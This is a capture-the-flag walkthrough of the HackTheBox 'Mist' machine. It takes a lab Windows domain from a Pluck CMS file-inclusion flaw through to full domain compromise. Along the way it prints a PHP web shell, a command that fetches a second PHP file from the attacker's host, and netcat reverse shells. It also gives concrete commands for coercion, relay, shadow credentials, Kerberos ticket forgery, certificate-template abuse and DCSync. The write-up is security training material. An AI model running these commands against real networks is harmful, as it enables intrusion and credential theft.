# HackTheBox - Mist


```bash
Nmap scan report for 10.10.11.17
Host is up (0.30s latency).          
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION  
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-generator: pluck 4.7.18                        
| http-robots.txt: 2 disallowed entries
|_/data/ /docs/                     
| http-methods:                   
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-title: Mist - Mist
|_Requested resource was http://10.10.11.17/?file=mist
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

From the scan we have only port 80 open, visiting the webserver we have Pluck hosted

<img src="https://i.imgur.com/aLzXzBb.png"/>

On trying to login we'll see the version from this page

<img src="https://i.imgur.com/crWjpDl.png"/>

This version is vulnerable to authenticated remote code execution but currently we don't know what's the password for admin user

<img src="https://i.imgur.com/wU9aGud.png"/>

Trying the default ones like password and admin didn't worked, fuzzing for files, there's `cgi-bin` directory which can reveal something here

<img src="https://i.imgur.com/bxLaygL.png"/>

So fuzzing again at this directory for any pl files, we can find `printenv.pl`

<img src="https://i.imgur.com/94WnzAn.png"/>

This file lists some configuration for XAMPP, showing a username as well, `svc_web`

<img src="https://i.imgur.com/W89aj8x.png"/>
Checking the github issues for Pluck CMS, there seems to be Local File Inclusion on `/data/modules/albums/albums_getimage.php?image=`

<img src="https://i.imgur.com/Tnh240I.png"/>

On trying to read `/etc/passwd` it was detecting `../` 

<img src="https://i.imgur.com/7XhkRSi.png"/>

We can however view the albums on pluck cms as shown in the poc for LFI from where we can list contents of albums directory revealing `admin_backup.php`

<img src="https://i.imgur.com/jjhfFhl.png"/>

This can be read through LFI

<img src="https://i.imgur.com/R55z7HG.png"/>

And this hash can be cracked with hashcat using mode 1700 which is for SHA-512

```bash
hashcat -a 0 -m 1700  ./admin_hash.txt /usr/share/wordlists/rockyou.txt --force
```

<img src="https://i.imgur.com/lDkoqZv.png"/>
<img src="https://i.imgur.com/w0Mq1cu.png"/>

With this password we can login as admin on pluck 

<img src="https://i.imgur.com/oq4LLkY.png"/>

Now we can use the previous RCE exploit by uploading a module by zipping a php file having GET parameter being passed into `system` function for executing commands

```bash
<?php system($_GET['cmd']); ?>
```

<img src="https://i.imgur.com/Ogf0JhC.png"/>

But this file will be deleted within 1-2 minutes so there's probably a cleanup script, for getting a shell, upload and execute netcat to get a reverse shell as `svc_web`

<img src="https://i.imgur.com/LDeCPkR.png"/>

Again as soon as the php file gets removed our shell will die

<img src="https://i.imgur.com/m6rR8Ea.png"/>

So what we can do here is to upload a php file where the cleanup script isn't deleting the files from, checking the permissions of `C:\xampp`, we have write access on this directory, so we can upload a php file there and then get a shell

<img src="https://i.imgur.com/1T3TAzh.png"/>

```bash
<?php system('curl http://10.10.16.17/uwu.php -o C:/xampp/htdocs/uwu.php'); ?>
```

<img src="https://i.imgur.com/OqdYOOt.png"/>

Checking the privileges of this local user, it doesn't seem to have any privilege which can lead to local admin

<img src="https://i.imgur.com/goyKo54.png"/>

Running `arp -a` to see the hosts on the network we get one IP `192.168.100.100` which seems it's the IP of domain controller

<img src="https://i.imgur.com/IgMzUcC.png"/>

For accessing this host from our kali machine we need to perform pivoting from MS01 using `ligolo-ng`

```bash
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
```

<img src="https://i.imgur.com/b5mtNZc.png"/>

We can confirm the reachability of DC01 by pinging or running nxc to check smb 

<img src="https://i.imgur.com/PHK6LUv.png"/>

Here I tried checking guest account for brute forcing SIDs to get a list of domain users but that account was disabled

<img src="https://i.imgur.com/O9YAi8S.png"/>

Also tried checking for AS-REP roasting on the two domain accounts we can see on MS01 but it also failed

<img src="https://i.imgur.com/1NoYB2t.png"/>

Enumerating shares with null authentication didn't yield any stuff as well

<img src="https://i.imgur.com/LRIn3Cp.png"/>

Moving back to MS01 and enumerating the system by uploading winpeas in `C:/xampp/htdocs/` as it is excluded by defender 

<img src="https://i.imgur.com/aLHct3F.png"/>

<img src="https://i.imgur.com/OK8DRPN.png"/>

`Brandon.keywarp` is logged in onto this system so there might be some tasks or file being checked by this user, there's also `Common Applications` directory which is writeable by local users

<img src="https://i.imgur.com/L3eo2Hc.png"/>

This directory contains few lnk files

<img src="https://i.imgur.com/bP5Sfmn.png"/>

Transferring any one of the lnk files on our windows machine to edit the location of the shortcut 

<img src="https://i.imgur.com/r7QCD0U.png"/>

Now editing this lnk file to execute nc from `C:\xampp\htdocs`to get a shell

<img src="https://i.imgur.com/iH1fgeb.png"/>

<img src="https://i.imgur.com/hQnOnXZ.png"/>

From here we can run bloodhound to enumerate the domain

<img src="https://i.imgur.com/8bfQXbJ.png"/>

Brandon didn't had any ACLs and wasn't in any special group

<img src="https://i.imgur.com/V4wFC8W.png"/>

It's the same with Sharon

<img src="https://i.imgur.com/CwyV3a6.png"/>

But there's Operatives group which has ReadGMSAPasswowrd on `SVC_CA$` account

<img src="https://i.imgur.com/KTULPCk.png"/>
And this group has these two group members who can also PSRemote on DC01

<img src="https://i.imgur.com/m3jrLSt.png"/>

<img src="https://i.imgur.com/dCo5SHA.png"/>

Since smb signing is enabled on DC01, we need to relay using HTTP authentication which can be done only if WebClient service is enabled which is currently disabled, this can be checked using `GetWebDAVStatus` https://github.com/G0ldenGunSec/GetWebDAVStatus

<img src="https://i.imgur.com/BrqlflN.png"/>

For enabling webclient service, start responder then try mapping the share to kali machine with http protocol

<img src="https://i.imgur.com/k6jyvzn.png"/>

<img src="https://i.imgur.com/Qa81Wy3.png"/>

<img src="https://i.imgur.com/fAt2kNz.png"/>

Since we have a shell as brandon, we can verify if ADCS is installed on DC using certutil

<img src="https://i.imgur.com/vNtDLyV.png"/>

Using `certify` we can list down the templates which are enabled, if `User` template is enabled we can then request a certificate and get the NTHash of brandon

<img src="https://i.imgur.com/YRbZRkf.png"/>

```bash
Certify.exe request /ca:DC01.mist.htb\mist-DC01-CA /template:User /domain:mist.htb 
```

<img src="https://i.imgur.com/VDyE1Bd.png"/>

Converting the pem into pfx file in order to use it for authenticating from certipy to retrieve NTLM hash of brandon

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

<img src="https://i.imgur.com/LxnzJI4.png"/>

```bash
certipy auth -pfx cert.pfx  -dc-ip 192.168.100.100  -username Brandon.Keywarp -domain mist.htb
```

<img src="https://i.imgur.com/PHC0W5C.png"/>

Now that  have brandon's hash, we can use PetitPotam to cause coercion for MS01 with webdav protocol which is going to perform HTTP authentication leading to shadow credentials on MS01 but before that let's verify if we can coerce the authentication on smb, for this we need to start chisel with socks proxy

```bash
.\chisel.exe client 10.10.16.43:9000 R:socks

chisel server --reverse -p 9000
```

<img src="https://i.imgur.com/ezT3jDK.png"/>

<img src="https://i.imgur.com/Aax5Cl3.png"/>

For HTTP coercion, webclient service will be enabled on port 8080, so we need to redirect that port from MS01 to our kali machine this is known as port bending, for this I'll be using StreamDivert for redirecting outbound traffic on port 8080 to my kali machine on port 80

```bash
tcp > 8080 0.0.0.0 -> 10.10.16.43 80
```

<img src="https://i.imgur.com/tb8UQTr.png"/>

Running PetitPotam again, this time setting the listener to be MS01 

```
 proxychains python3 /opt/PetitPotam/PetitPotam.py -u brandon.keywarp -hashes ':hash' MS01@8080/test 192.168.100.101
```

<img src="https://i.imgur.com/Ypo8nav.png"/>

This machine account hash can now be relayed to DC01 on ldaps to perform shadow credentials using ntlmrealyx (make sure turn HTTP Off from respnder.conf), normally machine accounts can edit their own `msDS-KeyCredentialLink` attribute but to my surprise this did not worked as it showed it's missing some rights here

<img src="https://i.imgur.com/mQCL4Um.png"/>

This probably because the value is already set and for some reason we cannot overwrite this property the value is cleared, there's another variation of ntlmrelayx which supports both clearing and setting the value of msDS-KeyCredentialLink using an interactive ldap shell, so realying it again but this time using this version  https://github.com/fortra/impacket/pull/1402

<img src="https://i.imgur.com/ihyRyko.png"/>

We now have the certificate and the password, using gettgtpkinit from PKINITools we can retrieve MS01 aeskey and TGT

<img src="https://i.imgur.com/Hrdeg8z.png"/>

NTHash can be recovered as well either by certipy auth or using Rubeus

```bash
Rubeus.exe asktgt /user:MS01$ /domain:mist.htb  /certificate:./orGRT9Km.pfx /password:aCSx4xhH2ZqvYxSAseyK /getcredentials /nowrap
```

<img src="https://i.imgur.com/eBQGeSf.png"/>
<img src="https://i.imgur.com/ZEbhpJ7.png"/>

Impersonating as local admin on MS01 using HOST service

```bash
Rubeus.exe s4u /self /user:MS01$ /rc4:4A74FC05400345D580CF58AEC3E6D833 /altservice:host/ms01.mist.htb /impersonateuser:administrator /ptt /nowrap
```

<img src="https://i.imgur.com/l7QwWWN.png"/>

Converting this kirbi (base64) ticket into ccache which is supported by impacket

<img src="https://i.imgur.com/ElECGBU.png"/>

And using `wmiexec.py` to get an interactive shell as admin

<img src="https://i.imgur.com/UwD8gZ3.png"/>

## Using ticketer.py

This can also be done purely through linux
```bash
proxychains ticketer.py -domain-sid S-1-5-21-1045809509-3006658589-2426055941 -domain mist.htb -spn HOST/MS01.mist.htb -nthash 4A74FC05400345D580CF58AEC3E6D833 -user-id 500 Administrator 
```

<img src="https://i.imgur.com/0hSvaQI.png"/>
<img src="https://i.imgur.com/O8iA35N.png"/>

From bloodhound we saw OP_Sharon is member of Operatives group who has ReadGMSA permission on SVC_CA$ and has PSRemote on DC, so Sharon on MS01 might be interesting, checking the Documents directory we have sharon.kdbx file which is a keepass database file that contains passwords

<img src="https://i.imgur.com/1KLwjUi.png"/>

<img src="https://i.imgur.com/rDhvoUG.png"/>

Reading this file will require a password

<img src="https://i.imgur.com/wTkzbZ2.png"/>

From Pictures directory, we have two image files

<img src="https://i.imgur.com/4M2l15v.png"/>

The second image shows us a password

<img src="https://i.imgur.com/cA9me6r.png"/>

The text `UA7cpa[#1!_*ZX` doesn't represent the base64 encoded value in the image

<img src="https://i.imgur.com/AlWMWgo.png"/>

So we might be missing some characters that we need to recover, creating a wordlist with `crunch` to brute forcing the last character

<img src="https://i.imgur.com/3rmgrAE.png"/>
Having the master password we can access the keepass file and get the password for sharon

<img src="https://i.imgur.com/r7LIC8L.png"/>

For moving forward I pivoted using ligolo-ng as proxychains is a bit slow in reaching to MS01 internal ports and DC01, by creating ligolo interface device and adding 192.168.100.0/24 route

<img src="https://i.imgur.com/HsQwp9y.png"/>

Spraying this password on both sharon and op_sharon

<img src="https://i.imgur.com/hOlxmiv.png"/>

Since op_sharon has PSRemote on DC, we can login through winrm

<img src="https://i.imgur.com/btIdVEx.png"/>

For reading GMSA password, we can use AD module but I'll be using gMSADumper python script  https://github.com/micahvandeusen/gMSADumper

```
python3 /opt/gMSADumper/gMSADumper.py -u 'OP_SHARON.MULLARD' -p 'pass' -d mist.htb -l 192.168.100.100
```

<img src="https://i.imgur.com/Teqvr0h.png"/>

Now with this account we can get access to SVC_CABackup user by having AddKeyCredentialLink access control, which basically is again performing shadow credentials attack through pyWhisker

```bash
 python3 pywhisker.py  -u 'svc_ca$' -H 'hash' -t SVC_CABACKUP -a add  -d mist.htb --dc-ip 192.168.100.100
```

<img src="https://i.imgur.com/tIaYpxS.png"/>
To retrieve the NThash, using the same steps which were performed for MS01$

```bash
Rubeus.exe asktgt /user:SVC_CABACKUP /domain:mist.htb  /certificate:./SW9Iavcw.pfx /password:ciCdAJ1qPObnqR57ltDL /getcredentials /nowrap
```

<img src="https://i.imgur.com/UnV8igL.png"/>
<img src="https://i.imgur.com/dwaIbYZ.png"/>

Recently two new ADCS attacks were introduced dubbed as ESC13 & ESC14, from certipy's github issues we can see support for ESC13 being added as well

<img src="https://i.imgur.com/y4Gx2vm.png"/>

So cloning this version of certipy  https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53, we can find a certificate template `ManagerAuthentication` being vulnerable to ESC13 

<img src="https://i.imgur.com/HHORzbT.png"/>

This template has an Extended Key Usage (EKU) for Client Authentication which means that through this certificate we can perform authentication, this certificate is linked with `Certificate Managers` group and members of certificate services can enroll for this certificate 

<img src="https://i.imgur.com/itzDTAJ.png"/>

explain abuse

Requesting the certificate with ManagerAuthentication template, this is going to show an error for public key not meeting the minimum size

<img src="https://i.imgur.com/orzb0ix.png"/>

By default certipy uses 2048 as the length of public key, this can be changed to 4096 with `-key-size` parameter

```bash
certipy req -u 'SVC_CABACKUP' -hashes 'hash' -ca 'mist-DC01-CA' -dc-ip 192.168.100.100 -template 'ManagerAuthentication' -key-size 4096
```

<img src="https://i.imgur.com/VNeqxlz.png"/>

We have the certificate for svc_backup but this holds the permissions of certificate managers, so requesting a TGT with this certificate

```
 python3 gettgtpkinit.py -cert-pfx ./svc_cabackup.pfx -dc-ip 192.168.100.100 mist.htb/SVC_CABACKUP SVC_CABACKUP.ccache
```

<img src="https://i.imgur.com/M2MZdUT.png"/>

Listing the templates again, we can see `BackupSvcAuthentication` can be enrolled with CA Backup members which we are with the current certificate that we have

<img src="https://i.imgur.com/UsuWhgq.png"/>

On requesting this certificate we can again privileges of `ServiceAccounts` group which is a member of `Backup Operators` group

<img src="https://i.imgur.com/WrBfipi.png"/>

Being in this group we can backup the registry hives to dump SAM hashes of DC account and then perform DCSync

```bash
certipy req -u 'SVC_CABACKUP@mist.htb' -k -no-pass -ca 'mist-DC01-CA' -dc-ip 192.168.100.100  -target DC01.mist.htb -template 'BackupSvcAuthentication' -key-size 4096
```

<img src="https://i.imgur.com/SBPkquU.png"/>

<img src="https://i.imgur.com/ae9hNoS.png"/>

Exporting this TGT and starting smb server through smbserver.py to backup the SAM, SYSTEM and SECURITY from the registry hive using `reg.py`

<img src="https://i.imgur.com/YElUqnZ.png"/>

<img src="https://i.imgur.com/WlDHpyA.png"/>

(For dumping SYSTEM file, it will take some time), after having these 3 files running secretsdump.py locally and using the `$MACHINE.ACC` hash to performing dcsync

<img src="https://i.imgur.com/yTwYBLX.png"/>

<img src="https://i.imgur.com/kVzyTta.png"/>



# References

- https://www.exploit-db.com/exploits/51592
- https://github.com/pluck-cms/pluck/issues/122
- https://github.com/G0ldenGunSec/GetWebDAVStatus
- https://github.com/jellever/StreamDivert
- https://github.com/fortra/impacket/pull/1402
- https://github.com/micahvandeusen/gMSADumper
- https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53
